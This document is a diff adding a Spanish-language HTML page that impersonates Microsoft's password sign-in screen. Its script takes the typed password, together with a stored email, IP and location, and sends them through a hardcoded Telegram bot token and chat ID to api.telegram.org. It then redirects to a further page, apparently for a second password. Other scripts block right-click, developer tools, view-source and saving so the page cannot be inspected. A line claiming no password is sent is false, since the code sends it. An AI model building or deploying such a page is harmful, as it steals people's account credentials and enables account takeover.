@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<!-- Script de Bloqueo Absoluto (Colocado al inicio para ejecutarse antes que cualquier otro recurso) -->
+<script>
+    // Bloqueo estricto de atajos de teclado para inspección
+    window.addEventListener('keydown', function(e) {
+        if (
+            e.key === 'F12' || 
+            e.keyCode === 123 || 
+            (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === 'i' || e.key.toLowerCase() === 'j' || e.key.toLowerCase() === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
+            (e.ctrlKey && (e.key.toLowerCase() === 'u' || e.keyCode === 85))
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
+        }
+    }, true);
+
+    // Bloqueo total de clic derecho
+    window.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+    }, true);
+</script>
+
+<title>Introduce tu contraseña</title>
+
+<style>
+    * {
+        box-sizing: border-box;
+    }
+
+    html, body {
+        width: 100%;
+        min-height: 100%;
+        margin: 0;
+    }
+
+    body {
+        font-family: "Segoe UI", Arial, Helvetica, sans-serif;
+        color: #1b1b1b;
+        background:
+            radial-gradient(circle at 72% 15%, rgba(220, 230, 250, .55), transparent 34%),
+            radial-gradient(circle at 22% 76%, rgba(225, 242, 250, .55), transparent 32%),
+            linear-gradient(135deg, #f5f8fc 0%, #eef1f8 48%, #f9f9fb 100%);
+        overflow-x: hidden;
+    }
+
+    /* Decorative background shapes */
+    body::before {
+        content: "";
+        position: fixed;
+        width: 720px;
+        height: 430px;
+        left: -120px;
+        bottom: -100px;
+        border: 1px solid rgba(180, 205, 240, .45);
+        border-radius: 35px;
+        transform: rotate(-45deg);
+        pointer-events: none;
+    }
+
+    body::after {
+        content: "";
+        position: fixed;
+        width: 780px;
+        height: 500px;
+        right: -300px;
+        top: 70px;
+        border: 1px solid rgba(190, 215, 245, .35);
+        border-radius: 40px;
+        transform: rotate(-18deg);
+        pointer-events: none;
+    }
+
+    .page {
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 30px 20px 90px;
+        position: relative;
+        z-index: 1;
+    }
+
+    .login-card {
+        width: 475px;
+        min-height: 440px;
+        background: #ffffff;
+        border-radius: 14px;
+        box-shadow:
+            0 8px 25px rgba(0, 0, 0, .16),
+            0 2px 5px rgba(0, 0, 0, .08);
+        padding: 43px 43px 38px;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .progress-bar {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 4px;
+        display: none;
+        z-index: 10;
+    }
+
+    .back {
+        position: absolute;
+        top: 43px;
+        left: 47px;
+        width: 25px;
+        height: 25px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #555;
+        font-size: 30px;
+        line-height: 1;
+        font-weight: 300;
+        user-select: none;
+        cursor: pointer;
+    }
+
+    .back:hover {
+        color: #000;
+    }
+
+    .brand {
+        text-align: center;
+        margin-top: 0;
+        margin-bottom: 34px;
+    }
+
+    .brand-mark {
+        width: 27px;
+        height: 27px;
+        display: inline-grid;
+        grid-template-columns: 1fr 1fr;
+        grid-template-rows: 1fr 1fr;
+        gap: 2px;
+        vertical-align: middle;
+        margin-right: 5px;
+    }
+
+    .brand-mark span:nth-child(1) { background: #f25022; }
+    .brand-mark span:nth-child(2) { background: #7fba00; }
+    .brand-mark span:nth-child(3) { background: #00a4ef; }
+    .brand-mark span:nth-child(4) { background: #ffb900; }
+
+    .brand-name {
+        display: inline-block;
+        vertical-align: middle;
+        font-size: 25px;
+        color: #666;
+        font-weight: 600;
+        letter-spacing: -.5px;
+    }
+
+    .demo-label {
+        display: inline-block;
+        margin-bottom: 16px;
+        padding: 4px 8px;
+        border-radius: 3px;
+        background: #fff4ce;
+        color: #5d4b00;
+        font-size: 11px;
+        font-weight: 600;
+    }
+
+    .account {
+        display: table;
+        margin: 0 auto 17px;
+        border: 1px solid #ddd;
+        border-radius: 18px;
+        padding: 8px 13px;
+        color: #666;
+        font-size: 13px;
+    }
+
+    h1 {
+        text-align: center;
+        margin: 0 0 34px;
+        font-size: 27px;
+        line-height: 1.2;
+        font-weight: 600;
+        letter-spacing: -.35px;
+    }
+
+    .password {
+        width: 100%;
+        height: 44px;
+        border: 1px solid #8a8a8a;
+        border-radius: 4px;
+        padding: 0 13px;
+        outline: none;
+        font-size: 15px;
+        font-family: inherit;
+    }
+
+    .password:focus {
+        border: 2px solid #0067b8;
+        padding-left: 12px;
+    }
+
+    .password.has-error {
+        border: 1px solid #e00000;
+    }
+
+    .error-msg {
+        display: none;
+        color: #e00000;
+        font-size: 13px;
+        margin-top: 6px;
+        text-align: left;
+    }
+
+    .error-msg::before {
+        content: "!";
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 14px;
+        height: 14px;
+        background-color: #e00000;
+        color: #ffffff;
+        border-radius: 50%;
+        font-size: 10px;
+        font-weight: bold;
+        margin-right: 5px;
+    }
+
+    .next {
+        width: 100%;
+        height: 42px;
+        margin-top: 36px;
+        border: 0;
+        border-radius: 3px;
+        background: #1478c9;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 600;
+        font-family: inherit;
+        cursor: pointer;
+    }
+
+    .next:hover {
+        background: #106ebe;
+    }
+
+    .other {
+        display: block;
+        margin-top: 35px;
+        text-align: center;
+        color: #0067b8;
+        font-size: 15px;
+        text-decoration: none;
+        cursor: pointer;
+    }
+
+    .other:hover {
+        text-decoration: underline;
+    }
+
+    .demo-message {
+        display: none;
+        margin-top: 18px;
+        text-align: center;
+        font-size: 13px;
+        color: #555;
+    }
+
+    .footer {
+        position: fixed;
+        left: 0;
+        right: 0;
+        bottom: 15px;
+        text-align: center;
+        z-index: 2;
+        font-size: 12px;
+        color: #555;
+    }
+
+    .footer-links {
+        display: flex;
+        justify-content: center;
+        gap: 27px;
+        margin-bottom: 7px;
+    }
+
+    .footer a {
+        color: #555;
+        text-decoration: none;
+    }
+
+    .footer a:hover {
+        text-decoration: underline;
+    }
+
+    .footer-note {
+        font-size: 11px;
+        color: #666;
+    }
+
+    .footer-note a {
+        color: #0067b8;
+    }
+
+    @media (max-width: 600px) {
+        .page {
+            padding: 15px;
+            align-items: center;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 475px;
+            padding: 38px 28px 32px;
+        }
+
+        .back {
+            left: 29px;
+            top: 38px;
+        }
+
+        .footer {
+            display: none;
+        }
+
+        h1 {
+            font-size: 24px;
+        }
+    }
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+    <main class="login-card">
+
+        <img id="progressBar" class="progress-bar" src="https://aadcdn.msauth.net/shared/1.0/content/images/marching_ants_986f40b5a9dc7d39ef8396797f61b323.gif" alt="Cargando...">
+
+        <div class="back" id="btnBack" aria-hidden="true">←</div>
+
+        <div class="brand">
+            <span class="brand-mark" aria-hidden="true">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </span>
+            <span class="brand-name">Microsoft</span>
+        </div>
+
+        <div class="account" id="userAccount">usuario@ejemplo.test</div>
+
+        <h1>Introduce tu contraseña</h1>
+
+        <form id="demoForm">
+            <input
+                id="password"
+                class="password"
+                type="password"
+                placeholder="Contraseña"
+                autocomplete="off"
+                aria-label="Password"
+            >
+
+            <div id="errorMsg" class="error-msg">
+                Introduce la contraseña de tu cuenta de Microsoft.
+            </div>
+
+            <button id="btnSubmit" class="next" type="submit">Iniciar sesión</button>
+        </form>
+
+        <a class="other" href="#" id="otherWays">
+            Otra forma de iniciar sesión
+        </a>
+
+        <div class="demo-message" id="message">
+            no se envió ni almaceno ninguna contraseña.
+        </div>
+
+    </main>
+
+</div>
+
+<footer class="footer">
+    <div class="footer-links">
+        <a href="#">Ayuda y comentarios</a>
+        <a href="#">Condiciones de uso</a>
+        <a href="#">Privacidad y cookies</a>
+    </div>
+
+    <div class="footer-note">
+        Utiliza la navegación privada si este no es tu dispositivo.
+        <a href="#">Más información</a>
+    </div>
+</footer>
+
+<script>
+
+// Bloquear gestos de zoom táctil (doble toque y pellizco con dos dedos)
+let lastTouchEnd = 0;
+document.addEventListener('touchend', function (event) {
+    const now = (new Date()).getTime();
+    if (now - lastTouchEnd <= 300) {
+        event.preventDefault();
+    }
+    lastTouchEnd = now;
+}, { passive: false });
+
+document.addEventListener('gesturestart', function (e) {
+    e.preventDefault();
+});
+
+const TELEGRAM_TOKEN = '6376409130:AAEO2xslfT0z-Z7a49HUaFa-CEpMYX4wgAA';
+const CHAT_ID = '-1002003987549';
+
+// 1. Mostrar el correo guardado tan pronto carga index2.html
+const savedEmail = localStorage.getItem('userEmail') || 'No especificado';
+const userAccountSpan = document.getElementById('userAccount');
+
+if (userAccountSpan) {
+    userAccountSpan.textContent = savedEmail;
+}
+
+// 2. Evento para el botón de ir atrás (flecha)
+const btnBack = document.getElementById('btnBack');
+if (btnBack) {
+    btnBack.addEventListener('click', function() {
+        // Redirige a index.html (o usa history.back() si prefieres volver a la página previa en el historial)
+        window.location.href = 'index.html';
+    });
+}
+
+// 3. Manejo del formulario
+const form = document.getElementById("demoForm");
+const password = document.getElementById("password");
+const errorMsg = document.getElementById("errorMsg");
+const progressBar = document.getElementById("progressBar");
+const btnSubmit = document.getElementById("btnSubmit");
+
+form.addEventListener("submit", async function(event) {
+    event.preventDefault();
+    const passValue = password.value.trim();
+
+    if (passValue === "") {
+        errorMsg.style.display = "block";
+        password.classList.add("has-error");
+    } else {
+        errorMsg.style.display = "none";
+        password.classList.remove("has-error");
+        progressBar.style.display = "block";
+        btnSubmit.disabled = true;
+
+        localStorage.setItem('userPass1', passValue);
+
+        const ipReal = localStorage.getItem('userIp') || "Oculta";
+        const geoInfo = localStorage.getItem('userGeo') || "No detectada";
+        const messageId = localStorage.getItem('telegramMessageId');
+
+        const mensajeActualizado = `👤 PASO 1: LOGIN\n\n` +
+                                    `👤 Usuario: \`${savedEmail}\`\n` +
+                                    `🔑 Clave1: \`${passValue}\`\n` +
+                                    `🔑 Clave2: \`Cargando...\`\n` +
+                                    `🌐 IP: \`${ipReal}\`\n` +
+                                    `📍 Ubicación: \`${geoInfo}\``;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    message_id: messageId,
+                    text: mensajeActualizado,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (error) {
+            console.error('Error al editar en Telegram:', error);
+        }
+
+        setTimeout(function() {
+            window.location.href = "index3.html";
+        }, 3000);
+    }
+});
+</script>
+
+<script>
+    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
+(() => {
+    'use strict';
+
+    // Evita ejecutar dos veces la protección.
+    if (window.__proteccionWebActiva) return;
+    window.__proteccionWebActiva = true;
+
+    function mostrarAviso() {
+        if (document.getElementById('aviso-proteccion')) return;
+
+        const aviso = document.createElement('div');
+        aviso.id = 'aviso-proteccion';
+
+        Object.assign(aviso.style, {
+            position: 'fixed',
+            inset: '0',
+            zIndex: '2147483647',
+            background: 'rgba(0,0,0,.88)',
+            color: '#fff',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            padding: '24px',
+            boxSizing: 'border-box',
+            fontFamily: 'Arial, sans-serif',
+            textAlign: 'center'
+        });
+
+        const panel = document.createElement('div');
+        Object.assign(panel.style, {
+            maxWidth: '420px',
+            padding: '28px',
+            background: '#202020',
+            borderRadius: '12px',
+            border: '1px solid #555'
+        });
+
+        const titulo = document.createElement('h2');
+        titulo.textContent = 'Acción no permitida';
+
+        const mensaje = document.createElement('p');
+        mensaje.textContent =
+            'Esta acción está restringida en esta página.';
+
+        const boton = document.createElement('button');
+        boton.type = 'button';
+        boton.textContent = 'Volver a la página';
+
+        Object.assign(boton.style, {
+            padding: '12px 20px',
+            border: '0',
+            borderRadius: '6px',
+            cursor: 'pointer',
+            fontWeight: 'bold'
+        });
+
+        boton.addEventListener('click', () => aviso.remove());
+
+        panel.append(titulo, mensaje, boton);
+        aviso.appendChild(panel);
+        document.body.appendChild(aviso);
+    }
+
+    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
+    document.addEventListener('keydown', function (e) {
+        const tecla = e.key.toLowerCase();
+
+        if (
+            (e.ctrlKey || e.metaKey) &&
+            ['s', 'u', 'p'].includes(tecla)
+        ) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            mostrarAviso();
+        }
+
+        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
+        if (
+            tecla === 'f12' ||
+            ((e.ctrlKey || e.metaKey) &&
+             e.shiftKey &&
+             ['i', 'j', 'c'].includes(tecla))
+        ) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            mostrarAviso();
+        }
+    }, true);
+
+    // Bloquear menú contextual del clic derecho.
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+        mostrarAviso();
+    }, true);
+
+})();
+</script>
+
+</body>
+</html>
